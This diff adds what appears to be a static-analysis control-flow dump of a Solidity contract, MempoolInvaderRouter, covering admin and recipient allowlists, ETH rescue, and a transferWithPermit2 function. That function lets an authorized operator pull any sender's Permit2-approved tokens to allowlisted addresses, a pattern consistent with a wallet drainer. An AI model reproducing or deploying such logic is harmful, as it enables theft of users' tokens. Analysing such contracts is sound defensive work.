@@ -1,0 +1,298 @@
+Contract: IERC20
+==================================================
+
+
+Contract: IPermit2
+==================================================
+
+
+Contract: MempoolInvaderRouter
+==================================================
+
+Function: constructor
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(_permit2 != address(0),Invalid PERMIT2 address)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: PERMIT2 = _permit2
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: owner = msg.sender
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: admins[msg.sender] = true
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  3 -> 4
+
+Function: transferOwnership
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(newOwner != address(0),Invalid address)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: OwnershipTransferred(owner,newOwner)
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: owner = newOwner
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: onlyOwner()
+
+Edges:
+  0 -> 4
+  1 -> 2
+  2 -> 3
+  4 -> 1
+
+Function: addAdmin
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(admin != address(0),Invalid address)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(! admins[admin],Already admin)
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: admins[admin] = true
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: AdminAdded(admin)
+
+  ID: 5
+  Type: NodeType.EXPRESSION
+  Expression: onlyOwner()
+
+Edges:
+  0 -> 5
+  1 -> 2
+  2 -> 3
+  3 -> 4
+  5 -> 1
+
+Function: removeAdmin
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(admins[admin],Not an admin)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(admin != owner,Owner cannot be removed as admin)
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: admins[admin] = false
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: AdminRemoved(admin)
+
+  ID: 5
+  Type: NodeType.EXPRESSION
+  Expression: onlyOwner()
+
+Edges:
+  0 -> 5
+  1 -> 2
+  2 -> 3
+  3 -> 4
+  5 -> 1
+
+Function: addRecipient
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(recipient != address(0),Invalid address)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: allowedRecipients[recipient] = true
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: RecipientAdded(recipient)
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: onlyOwner()
+
+Edges:
+  0 -> 4
+  1 -> 2
+  2 -> 3
+  4 -> 1
+
+Function: removeRecipient
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(allowedRecipients[recipient],Recipient not found)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: delete allowedRecipients[recipient]
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: RecipientRemoved(recipient)
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: onlyOwner()
+
+Edges:
+  0 -> 4
+  1 -> 2
+  2 -> 3
+  4 -> 1
+
+Function: transferWithPermit2
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(allowedRecipients[recipient],Recipient not allowed)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(IERC20(token).balanceOf(sender) >= amount,Insufficient balance)
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(amount <= type()(uint160).max,Amount exceeds uint160)
+
+  ID: 4
+  Type: NodeType.VARIABLE
+  Expression: transferDetails = new IPermit2.AllowanceTransferDetails[](1)
+
+  ID: 5
+  Type: NodeType.EXPRESSION
+  Expression: transferDetails[0] = IPermit2.AllowanceTransferDetails({from:sender,to:recipient,amount:uint160(amount),token:token})
+
+  ID: 6
+  Type: NodeType.EXPRESSION
+  Expression: IPermit2(PERMIT2).transferFrom(transferDetails)
+
+  ID: 7
+  Type: NodeType.EXPRESSION
+  Expression: TransferExecuted(sender,recipient,token,amount)
+
+  ID: 8
+  Type: NodeType.EXPRESSION
+  Expression: onlyAuthorized()
+
+Edges:
+  0 -> 8
+  1 -> 2
+  2 -> 3
+  3 -> 4
+  4 -> 5
+  5 -> 6
+  6 -> 7
+  8 -> 1
+
+Function: rescueETH
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(to != address(0),Invalid recipient address)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(address(this).balance >= amount,Not enough ETH balance)
+
+  ID: 3
+  Type: NodeType.VARIABLE
+  Expression: 
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: (success,None) = address(to).call{value: amount}()
+
+  ID: 5
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(success,Rescue ETH transfer failed)
+
+  ID: 6
+  Type: NodeType.EXPRESSION
+  Expression: ETHRescued(to,amount)
+
+  ID: 7
+  Type: NodeType.EXPRESSION
+  Expression: onlyOwner()
+
+Edges:
+  0 -> 7
+  1 -> 2
+  2 -> 3
+  3 -> 4
+  4 -> 5
+  5 -> 6
+  7 -> 1
+
+Function: receive
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+Edges:
+
+
